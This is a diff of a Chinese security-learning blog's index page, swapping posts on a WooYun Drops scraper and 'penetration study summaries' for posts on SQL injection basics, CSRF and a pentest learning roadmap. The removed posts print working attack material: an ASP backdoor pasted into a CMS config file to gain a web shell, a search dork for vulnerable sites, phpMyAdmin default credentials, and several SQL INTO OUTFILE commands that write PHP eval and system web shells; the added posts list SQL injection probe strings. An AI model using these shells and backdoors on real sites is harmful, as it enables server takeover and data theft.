@@ -55,117 +55,33 @@
     <header>
       
         <div class="icon"></div>
-        <time datetime="2016-07-04T12:17:37.000Z"><a href="/2016/07/04/18/">2016-07-04</a></time>
+        <time datetime="2016-06-14T07:33:42.000Z"><a href="/2016/06/14/13/">2016-06-14</a></time>
       
       
   
-    <h1 class="title"><a href="/2016/07/04/18/">python多线程爬乌云Drops文章</a></h1>
-  
-
-    </header>
-    <div class="entry">
-      
-        <h3 id="最近学习状态有点不太好，原因就是老师一再要求看乌云Drops上文章，其实之前都看过很多的，只是基础的原因，并不是看的很懂、而且很吃力。最近更是没法说，学的多一点，发现要学的也是多一点，好生气。"><a href="#最近学习状态有点不太好，原因就是老师一再要求看乌云Drops上文章，其实之前都看过很多的，只是基础的原因，并不是看的很懂、而且很吃力。最近更是没法说，学的多一点，发现要学的也是多一点，好生气。" class="headerlink" title="最近学习状态有点不太好，原因就是老师一再要求看乌云Drops上文章，其实之前都看过很多的，只是基础的原因，并不是看的很懂、而且很吃力。最近更是没法说，学的多一点，发现要学的也是多一点，好生气。"></a>最近学习状态有点不太好，原因就是老师一再要求看乌云Drops上文章，其实之前都看过很多的，只是基础的原因，并不是看的很懂、而且很吃力。最近更是没法说，学的多一点，发现要学的也是多一点，好生气。</h3><h3 id="没法了，只有不断的学呗，于是就生成一个淫荡的主意，把别人写好的文章下到本地，想什么时候看都可以。就开始上网看看Drops的源代码，之前写过类似的，还是比较轻松的，噼里啪啦一顿敲，完美收工。看看运行的结果不是很理想，就想着是不是要优化一下，又是噼里啪啦一顿敲，基本可以看，但还可以优化。"><a href="#没法了，只有不断的学呗，于是就生成一个淫荡的主意，把别人写好的文章下到本地，想什么时候看都可以。就开始上网看看Drops的源代码，之前写过类似的，还是比较轻松的，噼里啪啦一顿敲，完美收工。看看运行的结果不是很理想，就想着是不是要优化一下，又是噼里啪啦一顿敲，基本可以看，但还可以优化。" class="headerlink" title="没法了，只有不断的学呗，于是就生成一个淫荡的主意，把别人写好的文章下到本地，想什么时候看都可以。就开始上网看看Drops的源代码，之前写过类似的，还是比较轻松的，噼里啪啦一顿敲，完美收工。看看运行的结果不是很理想，就想着是不是要优化一下，又是噼里啪啦一顿敲，基本可以看，但还可以优化。"></a>没法了，只有不断的学呗，于是就生成一个淫荡的主意，把别人写好的文章下到本地，想什么时候看都可以。就开始上网看看Drops的源代码，之前写过类似的，还是比较轻松的，噼里啪啦一顿敲，完美收工。看看运行的结果不是很理想，就想着是不是要优化一下，又是噼里啪啦一顿敲，基本可以看，但还可以优化。</h3><h3 id="每一篇文章考虑到有额外的连接，照片的连接，首先想到是吧照片下载下来，后来觉得麻烦，拜拜，还是保持原有连接吧。"><a href="#每一篇文章考虑到有额外的连接，照片的连接，首先想到是吧照片下载下来，后来觉得麻烦，拜拜，还是保持原有连接吧。" class="headerlink" title="每一篇文章考虑到有额外的连接，照片的连接，首先想到是吧照片下载下来，后来觉得麻烦，拜拜，还是保持原有连接吧。"></a>每一篇文章考虑到有额外的连接，照片的连接，首先想到是吧照片下载下来，后来觉得麻烦，拜拜，还是保持原有连接吧。</h3><pre><code>def get_url(PageListUrls):
-   PageUrls = []
-   for url in PageListUrls:
-       patt = re.compile(r&quot;&lt;h2 class=\&quot;entry-title\&quot;&gt;&lt;a href=\&quot;(.*?)\&quot; rel=\&quot;bookmark\&quot; title=\&quot;.*?\&quot;&gt;.*?&lt;/a&gt;&lt;/h2&gt;&quot;)
-       content = requests.get(url)
-       article = patt.findall(content.text)
-       for aurl in article:
-           PageUrls.append(aurl)
-   return PageUrls
-</code></pre><h3 id="我的目的就是想在本地看的舒服，就按源码的形式保存下来，在本地也以html静态页面格式的保存，于是就写以下代码，获取文章的主要信息（标题、作者、内容等）"><a href="#我的目的就是想在本地看的舒服，就按源码的形式保存下来，在本地也以html静态页面格式的保存，于是就写以下代码，获取文章的主要信息（标题、作者、内容等）" class="headerlink" title="我的目的就是想在本地看的舒服，就按源码的形式保存下来，在本地也以html静态页面格式的保存，于是就写以下代码，获取文章的主要信息（标题、作者、内容等）"></a>我的目的就是想在本地看的舒服，就按源码的形式保存下来，在本地也以html静态页面格式的保存，于是就写以下代码，获取文章的主要信息（标题、作者、内容等）</h3><pre><code>def get_content(PageUrls):
-   for url in PageUrls:
-       #抓取页面
-       req = requests.get(url)
-       content = req.text
-       #获取标题
-       patt_title = re.compile(r&quot;&lt;h1 class=\&quot;entry-title ng-binding\&quot;&gt;(.*?)&lt;/h1&gt;&quot;)
-       title = patt_title.findall(content)
-       #获取作者
-       path_author = re.compile(r&quot;&lt;a href=\&quot;/author/.*?\&quot; class=\&quot;title ng-binding\&quot;&gt;(.*?)&lt;/a&gt;&quot;)
-       author = path_author.findall(content)
-       #获取文章内容
-       path_section = re.compile(r&quot;&lt;section class=\&quot;entry-content ng-binding\&quot; ng-bind-html=\&quot;postContentTrustedHtml\&quot;&gt;([\w\W]*?)&lt;/section&gt;&quot;)
-       section = path_section.findall(content)
-       #采集数据缓到本地
-       cache_Articles(url,title[0],author[0],section[0])
-</code></pre><h3 id="本来基本搞定了，可以按照预想的爬到所有的文章保存到本地，由于Drops上文章很多，加上所处环境渣的要命，整整搞了半小时才搞完，没办法，就想到了线程，有进一步的对代码进行优化，整理了一下多线程的代码，这次嗖嗖的快了很多，此时确实感觉python还可以，就是各种乱搞好不好。"><a href="#本来基本搞定了，可以按照预想的爬到所有的文章保存到本地，由于Drops上文章很多，加上所处环境渣的要命，整整搞了半小时才搞完，没办法，就想到了线程，有进一步的对代码进行优化，整理了一下多线程的代码，这次嗖嗖的快了很多，此时确实感觉python还可以，就是各种乱搞好不好。" class="headerlink" title="本来基本搞定了，可以按照预想的爬到所有的文章保存到本地，由于Drops上文章很多，加上所处环境渣的要命，整整搞了半小时才搞完，没办法，就想到了线程，有进一步的对代码进行优化，整理了一下多线程的代码，这次嗖嗖的快了很多，此时确实感觉python还可以，就是各种乱搞好不好。"></a>本来基本搞定了，可以按照预想的爬到所有的文章保存到本地，由于Drops上文章很多，加上所处环境渣的要命，整整搞了半小时才搞完，没办法，就想到了线程，有进一步的对代码进行优化，整理了一下多线程的代码，这次嗖嗖的快了很多，此时确实感觉python还可以，就是各种乱搞好不好。</h3><pre><code>j = 0
-for i in range(0,len(PageUrls)):
-    if j % ThreadExceNum == 0:
-        #加入线程
-        t1 = threading.Thread(target=get_article_content,args=(PageUrlGroup,))
-        threads.append(t1)
-        PageUrlGroup = []
-    else:
-        PageUrlGroup.append(PageUrls[i])
-    j = j + 1
-for t in threads:
-    try:
-        t.setDaemon(True)
-        t.start()
-    except Exception,ex:
-        print &quot;something error!&quot;
-t.join()
-</code></pre><h3 id="基本核心代码就是这些，找到链接及可变参数，获取到总共的页数进行循环访问，再进行匹配分析，然后保存到本地，over！感觉也没什么可解释的，一个简单的小脚本，就当练习一下。"><a href="#基本核心代码就是这些，找到链接及可变参数，获取到总共的页数进行循环访问，再进行匹配分析，然后保存到本地，over！感觉也没什么可解释的，一个简单的小脚本，就当练习一下。" class="headerlink" title="基本核心代码就是这些，找到链接及可变参数，获取到总共的页数进行循环访问，再进行匹配分析，然后保存到本地，over！感觉也没什么可解释的，一个简单的小脚本，就当练习一下。"></a>基本核心代码就是这些，找到链接及可变参数，获取到总共的页数进行循环访问，再进行匹配分析，然后保存到本地，over！感觉也没什么可解释的，一个简单的小脚本，就当练习一下。</h3>
-      
-    </div>
-    <footer>
-      
-        
-        
-      
-      <div class="clearfix"></div>
-    </footer>
-  </div>
-</article>
-
-
-
-
-  <article class="post">
-  
-  <div class="post-content">
-    <header>
-      
-        <div class="icon"></div>
-        <time datetime="2016-07-02T12:43:48.000Z"><a href="/2016/07/02/17/">2016-07-02</a></time>
-      
-      
-  
-    <h1 class="title"><a href="/2016/07/02/17/">渗透学习第一阶段总结[3]</a></h1>
+    <h1 class="title"><a href="/2016/06/14/13/">认识SQL</a></h1>
   
 
     </header>
     <div class="entry">
       
-        <h2 id="0x00-动力3-5拿shell"><a href="#0x00-动力3-5拿shell" class="headerlink" title="0x00 动力3.5拿shell"></a>0x00 动力3.5拿shell</h2><pre><code>inurl:printpage.asp?ArticleID=
-</code></pre><p>1.找到版权信息，把内容替换成：<br>版权所有 Copyright 2003 <a href='http://www.asp163.net'>动力空间</a>“ ‘版权信息</p>
-<pre><code>if Request(&quot;xiaoxin&quot;)=&quot;520&quot; then
-dim allen,creat,text,thisline,path
-if Request(&quot;creat&quot;)=&quot;yes&quot; then
-Set fs = CreateObject(&quot;Scripting.FileSystemObject&quot;) 
-Set outfile=fs.CreateTextFile(server.mappath(Request(&quot;path&quot;)))
-outfile.WriteLine Request(&quot;text&quot;)
-Response.write &quot;哈哈&quot;
-end if
-Response.write &quot;&lt;form method=&apos;POST&apos;action=&apos;&quot;&amp;Request.ServerVariables(&quot;URL&quot;)&amp;&quot;?xiaoxin=520&amp;creat=yes&apos;&gt;&quot;
-Response.write &quot;&lt;textarea name=&apos;text&apos;&gt;&quot;&amp;thisline&amp;&quot;&lt;/textarea&gt;&lt;br&gt;&quot;
-Response.write &quot;&lt;input type=&apos;text&apos; name=&apos;path&apos; value=&apos;&quot;&amp;Request(&quot;path&quot;)&amp;&quot;&apos;&gt;&quot;
-Response.write &quot;&lt;input name=&apos;submit&apos; type=&apos;submit&apos; value=&apos;ok&apos; &gt;&lt;/form&gt;&quot;
-Response.end
-end if 
-%&gt; 
-</code></pre><p>2.然后保存，千万别跳转任何页面，直接在IE地址栏内将 admin/Admin_Login.asp 替换成 inc/config.asp?xiaoxin=520<br>3.成功后会进入一个像小马一样的页面，粘贴木马代码以及写上木马文件名即可拿到wshell，木马在inc目录。</p>
-<h2 id="0x01-动易cms拿shell"><a href="#0x01-动易cms拿shell" class="headerlink" title="0x01 动易cms拿shell"></a>0x01 动易cms拿shell</h2><p>点击网站配置，在网站名称后面插入一句话木马，连接inc/config.asp</p>
-<h2 id="0x02-aspcms"><a href="#0x02-aspcms" class="headerlink" title="0x02 aspcms"></a>0x02 aspcms</h2>
+        <h2 id="SQL注入是什么"><a href="#SQL注入是什么" class="headerlink" title="SQL注入是什么"></a>SQL注入是什么</h2><h3 id="SQL注入是一种将SQL代码插入或添加到应用（用户）的输入参数中的攻击，之后再将这些参数传递给后台的SQL服务器加以解析并执行。"><a href="#SQL注入是一种将SQL代码插入或添加到应用（用户）的输入参数中的攻击，之后再将这些参数传递给后台的SQL服务器加以解析并执行。" class="headerlink" title="SQL注入是一种将SQL代码插入或添加到应用（用户）的输入参数中的攻击，之后再将这些参数传递给后台的SQL服务器加以解析并执行。"></a>SQL注入是一种将SQL代码插入或添加到应用（用户）的输入参数中的攻击，之后再将这些参数传递给后台的SQL服务器加以解析并执行。</h3><h2 id="SQL注入漏洞产生原理"><a href="#SQL注入漏洞产生原理" class="headerlink" title="SQL注入漏洞产生原理"></a>SQL注入漏洞产生原理</h2><h3 id="对构造成SQL语句的变量，过滤不严格，造成可以构造任意的SQL语句，传递到数据库执行。"><a href="#对构造成SQL语句的变量，过滤不严格，造成可以构造任意的SQL语句，传递到数据库执行。" class="headerlink" title="对构造成SQL语句的变量，过滤不严格，造成可以构造任意的SQL语句，传递到数据库执行。"></a>对构造成SQL语句的变量，过滤不严格，造成可以构造任意的SQL语句，传递到数据库执行。</h3><h2 id="哪里能够引发SQL注入"><a href="#哪里能够引发SQL注入" class="headerlink" title="哪里能够引发SQL注入"></a>哪里能够引发SQL注入</h2><pre><code>* get query string
+* port string
+* http header
+</code></pre><h2 id="SQL注入分类"><a href="#SQL注入分类" class="headerlink" title="SQL注入分类"></a>SQL注入分类</h2><pre><code>* UNION query SQL injection（可联合查询注入）
+* Boolean-based blind SQL injection（布尔型注入）
+* Error-based SQL injection（报错型注入）
+* Stacked queries SQL injection（可多语句查询注入）
+* Time-based blind SQL injection（基于时间延迟注入）
+</code></pre><h2 id="如何判断SQL注入"><a href="#如何判断SQL注入" class="headerlink" title="如何判断SQL注入"></a>如何判断SQL注入</h2><pre><code><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&apos;</span><br><span class="line">\</span><br><span class="line">and 1=1  / and 1=2</span><br><span class="line">+1 / -1</span><br><span class="line">and sleep(5)</span><br><span class="line">………</span><br></pre></td></tr></table></figure>
+</code></pre><h2 id="SQL注入利用手法"><a href="#SQL注入利用手法" class="headerlink" title="SQL注入利用手法"></a>SQL注入利用手法</h2><h3 id="UNION-query-SQL-injection（可联合查询注入）"><a href="#UNION-query-SQL-injection（可联合查询注入）" class="headerlink" title="UNION query SQL injection（可联合查询注入）"></a>UNION query SQL injection（可联合查询注入）</h3><h4 id="优点：方便-易于利用-快捷"><a href="#优点：方便-易于利用-快捷" class="headerlink" title="优点：方便 易于利用 快捷"></a>优点：方便 易于利用 快捷</h4>
       
     </div>
     <footer>
       
         
           <div class="alignleft">
-            <a href="/2016/07/02/17/#more" class="more-link">Read More</a>
+            <a href="/2016/06/14/13/#more" class="more-link">Read More</a>
           </div>
         
         
@@ -184,40 +100,104 @@ end if
     <header>
       
         <div class="icon"></div>
-        <time datetime="2016-07-02T12:20:40.000Z"><a href="/2016/07/02/15/">2016-07-02</a></time>
+        <time datetime="2016-06-14T07:33:36.000Z"><a href="/2016/06/14/12/">2016-06-14</a></time>
       
       
   
-    <h1 class="title"><a href="/2016/07/02/15/">渗透学习第一阶段总结[2]</a></h1>
+    <h1 class="title"><a href="/2016/06/14/12/">linux加固小脚本</a></h1>
   
 
     </header>
     <div class="entry">
       
-        <h2 id="0x00-linux"><a href="#0x00-linux" class="headerlink" title="0x00 linux"></a>0x00 linux</h2><p>解析格式：1.php.xxx (xxx可以是任意)<br>如果apache不认识后缀为rar的文件，我们就用1.php.rar格式上传，文件就会被服务器当做PHP脚本解析。<br>辨别linux系统方法，例如：<a href="http://www.xxx.com/xxx/abc.asp?id=125">http://www.xxx.com/xxx/abc.asp?id=125</a> 把b换成大写B访问，如果出错了，就说明是linux系统，反之是windows系统</p>
-<h2 id="0x01-旁注"><a href="#0x01-旁注" class="headerlink" title="0x01 旁注"></a>0x01 旁注</h2><p>旁注的技巧就是挑选支持aspx的站来日，这样提权时候希望较大，如何探测服务器上哪些站点支持aspx呢? 利用bing搜索：<a href="http://cn.bing.com/">http://cn.bing.com/</a> 搜索格式：ip:服务器ip aspx<br>比如要入侵一个网站，想知道该网站支不支持aspx，就在网站后面随便加上一个xxx.aspx回车，如果显示的不是iis默认的错误页面，而是这种：“/”应用程序中的服务器错误，说明支持aspx马。</p>
-<h2 id="0x02-phpmyadmin"><a href="#0x02-phpmyadmin" class="headerlink" title="0x02 phpmyadmin"></a>0x02 phpmyadmin</h2><p>查看版本：test.php 或 phpinfo.php<br>默认账号密码：root root<br>万能帐号密码：’localhost’@’@” 密码空<br>拿shell第一种方法：</p>
-<pre><code>CREATE TABLE `mysql`.`darkmoon` (`darkmoon1` TEXT NOT NULL );
-INSERT INTO `mysql`.`darkmoon` (`darkmoon1` ) VALUES (&apos;&lt;?php @eval($_POST[pass]);?&gt;&apos;);
-SELECT `darkmoon1` FROM `darkmoon` INTO OUTFILE &apos;d:/wamp/www/darkmoon.php&apos;;
-DROP TABLE IF EXISTS `darkmoon`;
-</code></pre><p>拿shell第二种方法：</p>
-<pre><code>Create TABLE moon (darkmoon text NOT NULL);
-Insert INTO moon (darkmoon) VALUES(&apos;&lt;?php @eval($_POST[pass]);?&gt;&apos;);
-select darkmoon from moon into outfile &apos;d:/wamp/www/darkmoon2.php&apos;;
-Drop TABLE IF EXISTS moon;
-</code></pre><p>拿shell第三种方法：</p>
-<pre><code>select &apos;&lt;?php @eval($_POST[pass]);?&gt;&apos;INTO OUTFILE &apos;d:/wamp/www/darkmoon3.php&apos;
-</code></pre><p>拿shell第四种方法</p>
-<pre><code>select &apos;&lt;?php echo \&apos;&lt;pre&gt;\&apos;;system($_GET[\&apos;cmd\&apos;]); echo \&apos;&lt;/pre&gt;\&apos;; ?&gt;&apos; INTO OUTFILE &apos;d:/wamp/www/darkmoon4.php&apos;
-</code></pre><p>127.0.0.1/darkmoon4.php?cmd=net user<br>找到mysql数据库，执行sql语句即可写入一句话，再菜刀连接即可。<br>phpmyadmin脱裤：在这里面是可以直接拖库的，如同上传php拖库脚本一样，操作差不多的。<br>修改mysql默认的root用户名方法:<br>进入phpmyadmin,进入mysql表,执行sql语句<br>         1.update user set user=’你的新root用户名’ where user=’root’;<br>         2.flush privileges;<br>例如：<br>用root身份登入，进入mysql库，修改user表即可。<br>         1.use mysql;<br>         2.mysql&gt;update user set user=’newName’ where user=’root’;<br>         3.mysql&gt; flush privileges;   </p>
+        
+      
+    </div>
+    <footer>
+      
+        
+        
+      
+      <div class="clearfix"></div>
+    </footer>
+  </div>
+</article>
+
+
+
+
+  <article class="post">
+  
+  <div class="post-content">
+    <header>
+      
+        <div class="icon"></div>
+        <time datetime="2016-06-14T07:32:50.000Z"><a href="/2016/06/14/11/">2016-06-14</a></time>
+      
+      
+  
+    <h1 class="title"><a href="/2016/06/14/11/">浅谈CSRF</a></h1>
+  
+
+    </header>
+    <div class="entry">
+      
+        <h2 id="0x00-CSRF背景介绍："><a href="#0x00-CSRF背景介绍：" class="headerlink" title="0x00 CSRF背景介绍："></a>0x00 CSRF背景介绍：</h2><h3 id="跨站请求伪造（Cross-Site-Request-Forgery，CSRF）是一种使已登录用户在不知情的情况下执行某种动作的攻击。因为攻击者看不到伪造请求的响应结果，所以CSRF攻击主要用来执行动作，而非窃取用户数据。当受害者是一个普通用户时，CSRF可以实现在其不知情的情况下转移用户资金、发送邮件等操作；但是如果受害者是一个具有管理员权限的用户时CSRF则可能威胁到整个Web系统的安全。"><a href="#跨站请求伪造（Cross-Site-Request-Forgery，CSRF）是一种使已登录用户在不知情的情况下执行某种动作的攻击。因为攻击者看不到伪造请求的响应结果，所以CSRF攻击主要用来执行动作，而非窃取用户数据。当受害者是一个普通用户时，CSRF可以实现在其不知情的情况下转移用户资金、发送邮件等操作；但是如果受害者是一个具有管理员权限的用户时CSRF则可能威胁到整个Web系统的安全。" class="headerlink" title="跨站请求伪造（Cross-Site Request Forgery，CSRF）是一种使已登录用户在不知情的情况下执行某种动作的攻击。因为攻击者看不到伪造请求的响应结果，所以CSRF攻击主要用来执行动作，而非窃取用户数据。当受害者是一个普通用户时，CSRF可以实现在其不知情的情况下转移用户资金、发送邮件等操作；但是如果受害者是一个具有管理员权限的用户时CSRF则可能威胁到整个Web系统的安全。"></a>跨站请求伪造（Cross-Site Request Forgery，CSRF）是一种使已登录用户在不知情的情况下执行某种动作的攻击。因为攻击者看不到伪造请求的响应结果，所以CSRF攻击主要用来执行动作，而非窃取用户数据。当受害者是一个普通用户时，CSRF可以实现在其不知情的情况下转移用户资金、发送邮件等操作；但是如果受害者是一个具有管理员权限的用户时CSRF则可能威胁到整个Web系统的安全。</h3><h2 id="0x01-成因："><a href="#0x01-成因：" class="headerlink" title="0x01 成因："></a>0x01 成因：</h2><h3 id="服务器错把“经过认证的浏览器发起的请求”当成“经过认证的用户发起的请求”，当已认证的用户点击攻击者构造的恶意链接后就“被”执行了相应的操作。由于目标站无token-referer限制，导致攻击者可以用户的身份完成操作达到各种目的。根据HTTP请求方式，CSRF利用方式可分为GET、POST和Flash、CSRF蠕虫等。"><a href="#服务器错把“经过认证的浏览器发起的请求”当成“经过认证的用户发起的请求”，当已认证的用户点击攻击者构造的恶意链接后就“被”执行了相应的操作。由于目标站无token-referer限制，导致攻击者可以用户的身份完成操作达到各种目的。根据HTTP请求方式，CSRF利用方式可分为GET、POST和Flash、CSRF蠕虫等。" class="headerlink" title="服务器错把“经过认证的浏览器发起的请求”当成“经过认证的用户发起的请求”，当已认证的用户点击攻击者构造的恶意链接后就“被”执行了相应的操作。由于目标站无token/referer限制，导致攻击者可以用户的身份完成操作达到各种目的。根据HTTP请求方式，CSRF利用方式可分为GET、POST和Flash、CSRF蠕虫等。"></a>服务器错把“经过认证的浏览器发起的请求”当成“经过认证的用户发起的请求”，当已认证的用户点击攻击者构造的恶意链接后就“被”执行了相应的操作。由于目标站无token/referer限制，导致攻击者可以用户的身份完成操作达到各种目的。根据HTTP请求方式，CSRF利用方式可分为GET、POST和Flash、CSRF蠕虫等。</h3><h2 id="0x02-利用："><a href="#0x02-利用：" class="headerlink" title="0x02 利用："></a>0x02 利用：</h2><h3 id="1、GET类型的CSRF一般是由于程序员安全意识不强造成的。GET类型的CSRF利用非常简单，只需要一个HTTP请求就可以。"><a href="#1、GET类型的CSRF一般是由于程序员安全意识不强造成的。GET类型的CSRF利用非常简单，只需要一个HTTP请求就可以。" class="headerlink" title="1、GET类型的CSRF一般是由于程序员安全意识不强造成的。GET类型的CSRF利用非常简单，只需要一个HTTP请求就可以。"></a>1、GET类型的CSRF一般是由于程序员安全意识不强造成的。GET类型的CSRF利用非常简单，只需要一个HTTP请求就可以。</h3><h3 id="2、POST类型的CSRF危害没有GET型的大，利用起来通常使用的是一个自动提交的隐藏表单。"><a href="#2、POST类型的CSRF危害没有GET型的大，利用起来通常使用的是一个自动提交的隐藏表单。" class="headerlink" title="2、POST类型的CSRF危害没有GET型的大，利用起来通常使用的是一个自动提交的隐藏表单。"></a>2、POST类型的CSRF危害没有GET型的大，利用起来通常使用的是一个自动提交的隐藏表单。</h3><h3 id="3、Flash-CSRF通常是由于Crossdomain-xml文件配置不当造成的，利用方法是使用swf来发起跨站请求伪造，如"><a href="#3、Flash-CSRF通常是由于Crossdomain-xml文件配置不当造成的，利用方法是使用swf来发起跨站请求伪造，如" class="headerlink" title="3、Flash CSRF通常是由于Crossdomain.xml文件配置不当造成的，利用方法是使用swf来发起跨站请求伪造，如:"></a>3、Flash CSRF通常是由于Crossdomain.xml文件配置不当造成的，利用方法是使用swf来发起跨站请求伪造，如:</h3><h4 id="Flash跨域权限管理文件设置为允许所有主机域名跨域对本站进行读写数据"><a href="#Flash跨域权限管理文件设置为允许所有主机域名跨域对本站进行读写数据" class="headerlink" title="Flash跨域权限管理文件设置为允许所有主机域名跨域对本站进行读写数据"></a>Flash跨域权限管理文件设置为允许所有主机域名跨域对本站进行读写数据</h4><pre><code>    &lt;cross-domain-policy&gt;
+        &lt;allow-access-from domain=&quot;*&quot;/&gt;
+    &lt;/cross-domain-policy&gt;
+Flash跨域权限管理文件过滤规则不严导致可以从其它任何域传Flash产生CSRF。
+</code></pre><h3 id="4、CSRF常见的危害是攻击者可以在用户不知情的情况下以用户的身份进行指定的操作，但实际上CSRF的危害远不止于此，经过特意构造的CSRF可以产生蠕虫的效果。如某社区私信好友的接口和获取好友列表的接口都存在CSRF漏洞，攻击者就可以将其组合成一个CSRF蠕虫——当一个用户访问恶意页面后通过CSRF获取其好友列表信息，然后再利用私信好友的CSRF漏洞给其每个好友发送一条指向恶意页面的信息，只要有人查看这个信息里的链接，CSRF蠕虫就会不断传播下去，其可能造成的危害和影响非常巨大。"><a href="#4、CSRF常见的危害是攻击者可以在用户不知情的情况下以用户的身份进行指定的操作，但实际上CSRF的危害远不止于此，经过特意构造的CSRF可以产生蠕虫的效果。如某社区私信好友的接口和获取好友列表的接口都存在CSRF漏洞，攻击者就可以将其组合成一个CSRF蠕虫——当一个用户访问恶意页面后通过CSRF获取其好友列表信息，然后再利用私信好友的CSRF漏洞给其每个好友发送一条指向恶意页面的信息，只要有人查看这个信息里的链接，CSRF蠕虫就会不断传播下去，其可能造成的危害和影响非常巨大。" class="headerlink" title="4、CSRF常见的危害是攻击者可以在用户不知情的情况下以用户的身份进行指定的操作，但实际上CSRF的危害远不止于此，经过特意构造的CSRF可以产生蠕虫的效果。如某社区私信好友的接口和获取好友列表的接口都存在CSRF漏洞，攻击者就可以将其组合成一个CSRF蠕虫——当一个用户访问恶意页面后通过CSRF获取其好友列表信息，然后再利用私信好友的CSRF漏洞给其每个好友发送一条指向恶意页面的信息，只要有人查看这个信息里的链接，CSRF蠕虫就会不断传播下去，其可能造成的危害和影响非常巨大。"></a>4、CSRF常见的危害是攻击者可以在用户不知情的情况下以用户的身份进行指定的操作，但实际上CSRF的危害远不止于此，经过特意构造的CSRF可以产生蠕虫的效果。如某社区私信好友的接口和获取好友列表的接口都存在CSRF漏洞，攻击者就可以将其组合成一个CSRF蠕虫——当一个用户访问恶意页面后通过CSRF获取其好友列表信息，然后再利用私信好友的CSRF漏洞给其每个好友发送一条指向恶意页面的信息，只要有人查看这个信息里的链接，CSRF蠕虫就会不断传播下去，其可能造成的危害和影响非常巨大。</h3><h2 id="0x03-修复："><a href="#0x03-修复：" class="headerlink" title="0x03 修复："></a>0x03 修复：</h2><h3 id="关键操作用POST请求，"><a href="#关键操作用POST请求，" class="headerlink" title="关键操作用POST请求，"></a>关键操作用POST请求，</h3><h4 id="1、验证码"><a href="#1、验证码" class="headerlink" title="1、验证码"></a>1、验证码</h4><pre><code>- CSRF攻击的过程，往往是在用户不知情的情况下构造网络请求。所以如果使用验证码，那么每次操作都需要用户进行互动，从而简单有效的防御了CSRF攻击。
+- 但是如果你在一个网站作出任何举动都要输入验证码会严重影响用户体验，所以验证码一般只出现在特殊操作里面，或者在注册时候使用
+</code></pre><h4 id="2、检测refer"><a href="#2、检测refer" class="headerlink" title="2、检测refer"></a>2、检测refer</h4><pre><code>- 常见的互联网页面与页面之间是存在联系的，比如你在www.baidu.com应该是找不到通往www.google.com的链接的，再比如你在论坛留言，那么不管你留言后重定向到哪里去了，之前的那个网址一定会包含留言的输入框，这个之前的网址就会保留在新页面头文件的Referer中
+- 通过检查Referer的值，我们就可以判断这个请求是合法的还是非法的，但是问题出在服务器不是任何时候都能接受到Referer的值，所以Refere Check 一般用于监控CSRF攻击的发生，而不用来抵御攻击。
+</code></pre><h4 id="3、Token"><a href="#3、Token" class="headerlink" title="3、Token"></a>3、Token</h4><pre><code>- 目前主流的做法是使用Token抵御CSRF攻击。下面通过分析CSRF 攻击来理解为什么Token能够有效
+- CSRF攻击要成功的条件在于攻击者能够预测所有的参数从而构造出合法的请求。所以根据不可预测性原则，我们可以对参数进行加密从而防止CSRF攻击。
+- 另一个更通用的做法是保持原有参数不变，另外添加一个参数Token，其值是随机的。这样攻击者因为不知道Token而无法构造出合法的请求进行攻击。
+- Token 使用原则
+  Token要足够随机————只有这样才算不可预测
+  Token是一次性的，即每次请求成功后要更新Token————这样可以增加攻击难度，增加预测难度
+  Token要注意保密性————敏感操作使用post，防止Token出现在URL中
+</code></pre>
+      
+    </div>
+    <footer>
+      
+        
+        
+      
+      <div class="clearfix"></div>
+    </footer>
+  </div>
+</article>
+
+
+
+
+  <article class="post">
+  
+  <div class="post-content">
+    <header>
+      
+        <div class="icon"></div>
+        <time datetime="2016-05-06T02:42:07.000Z"><a href="/2016/05/06/10/">2016-05-06</a></time>
+      
+      
+  
+    <h1 class="title"><a href="/2016/05/06/10/">小白到小黑</a></h1>
+  
+
+    </header>
+    <div class="entry">
+      
+        <h2 id="渗透测试基础知识"><a href="#渗透测试基础知识" class="headerlink" title="渗透测试基础知识"></a>渗透测试基础知识</h2><h4 id="这些知识真的很大，首先作为一个新手的我现在也同样处在迷茫期，要学的知识多、杂。有时都不知道从什么地方入手，还好我们生在一个好年代，Internet发展如此快，只有你想不到，没有找不到的，具体怎么运用就看自己的了，写个总结，慢慢看着，主要是能提醒我自己。。。"><a href="#这些知识真的很大，首先作为一个新手的我现在也同样处在迷茫期，要学的知识多、杂。有时都不知道从什么地方入手，还好我们生在一个好年代，Internet发展如此快，只有你想不到，没有找不到的，具体怎么运用就看自己的了，写个总结，慢慢看着，主要是能提醒我自己。。。" class="headerlink" title="这些知识真的很大，首先作为一个新手的我现在也同样处在迷茫期，要学的知识多、杂。有时都不知道从什么地方入手，还好我们生在一个好年代，Internet发展如此快，只有你想不到，没有找不到的，具体怎么运用就看自己的了，写个总结，慢慢看着，主要是能提醒我自己。。。"></a>这些知识真的很大，首先作为一个新手的我现在也同样处在迷茫期，要学的知识多、杂。有时都不知道从什么地方入手，还好我们生在一个好年代，Internet发展如此快，只有你想不到，没有找不到的，具体怎么运用就看自己的了，写个总结，慢慢看着，主要是能提醒我自己。。。</h4><p>网络、编程、系统。。。好多、好多、</p>
+<p>一、HTTP协议、操作系统<br>系统：Windows/Linux<br>服务：HTTP服务、FTP服务、SSH服务等<br>文件系统、权限、防火墙等<br>端口、IDS、IPS<br>二、Web前端<br>HTML/CSS、XML、JavaScript、Ajax、Jquery<br>PHP、ASP、.NET、JSP 等<br>三、数据库<br>MySql、SqlServer、Oracle、DB2、Nosql<br>四、常见漏洞<br>IIS、Apache、Nginx<br>五、注入<br>主站相对来说比较安全，没有突破口，可以利用和主站在一个服务器上面的网站进行突破。<br>六、探测<br>在线工具网站（ip查询、端口扫描、CDN查询、二级域名、旁站查询、ICP备案、whois、web识别、社工库查询、Email、用户搜索、图片查询、短信验证等）涉及：端口信息、服务信息等<br>七、漏洞扫描<br>工具：Burp、AWVS、AppScan、Nessus、W3af、Shipfish<br>八、测试工具<br>Sqlmap、Havij、Pangolin、Waf3、Burp、nmap<br>九、逻辑漏洞<br>比如：任意用户密码重置、刷积分、信息泄露等<br>程序的逻辑和人类的逻辑不一致导致漏洞产生<br>
       
     </div>
     <footer>
       
         
           <div class="alignleft">
-            <a href="/2016/07/02/15/#more" class="more-link">Read More</a>
+            <a href="/2016/05/06/10/#more" class="more-link">Read More</a>
           </div>
         
         
@@ -236,24 +216,28 @@ Drop TABLE IF EXISTS moon;
     <header>
       
         <div class="icon"></div>
-        <time datetime="2016-07-02T12:20:38.000Z"><a href="/2016/07/02/16/">2016-07-02</a></time>
